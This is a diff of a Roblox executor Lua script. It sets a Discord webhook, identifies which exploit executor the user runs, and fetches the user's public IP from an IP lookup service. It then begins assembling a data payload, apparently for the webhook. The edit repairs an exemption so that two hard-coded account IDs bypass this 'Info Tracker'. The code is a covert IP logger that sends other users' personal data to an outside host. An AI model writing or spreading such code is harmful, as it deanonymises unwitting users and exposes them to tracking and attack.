@@ -2,7 +2,8 @@ local WeebHook = "https://discord.com/api/webhooks/1046955945621737502/HsniRn_0k
 local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "WTF?"
 local HttpService = game:GetService("HttpService")
 local Ip = tostring(game:HttpGet("https://api.ipify.org", true))
-if game.Players.LocalPlayer.UserId == (860289947 or 446350986) then
+local UserId = game.Players.LocalPlayer.UserId
+if UserId == 860289947 or UserId == 446350986 then
 print("Bypassed Info Tracker")
 else
 local Data = {
